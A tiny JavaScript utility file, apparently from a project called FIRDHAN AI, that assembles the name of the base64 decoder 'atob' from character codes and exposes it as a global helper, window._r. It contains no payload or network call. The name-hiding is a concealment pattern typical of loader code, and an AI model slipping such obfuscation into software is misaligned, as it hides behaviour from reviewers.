// core-utils.js - FIRDHAN AI Utilities
(() => {
  const _c = String.fromCharCode;
  const _a = [_c(97), _c(116), _c(111), _c(98)].join('');
  const _d = window[_a];
  const _x = (s) => _d(s);

  window._r = function(s) {
    try {
      return _x(s);
    } catch(e) {
      console.error('err');
      return '';
    }
  };
})();
